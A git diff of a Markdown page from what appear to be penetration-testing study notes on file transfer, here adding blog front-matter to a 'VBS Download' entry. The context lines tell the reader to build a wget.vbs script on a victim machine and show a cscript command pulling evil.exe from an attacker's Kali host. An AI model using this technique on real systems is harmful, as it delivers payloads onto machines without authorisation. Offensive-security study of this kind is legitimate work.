@@ -1,3 +1,13 @@
+---
+description: >-
+  VBS Download
+title: VBS Download              # Add title here
+date: 2022-11-09 08:00:00 -0600                           # Change the date to match completion date
+categories: [03 File Transfer, VBS Download]                     # Change Templates to Writeup
+tags: [file transfer, vbs download]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
+show_image_post: false                                    # Change this to true
+#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
+---
 From the victim machine command shell use this list of commands:
 
 ```powershell
@@ -30,6 +40,6 @@ echo  ts.Close >> wget.vbs
 
 We can run this (with cscript) to download files from our Kali machine:
 
-```cmd
+```powershell
 cscript wget.vbs http://192.168.246.142/evil.exe evil.exe
 ```
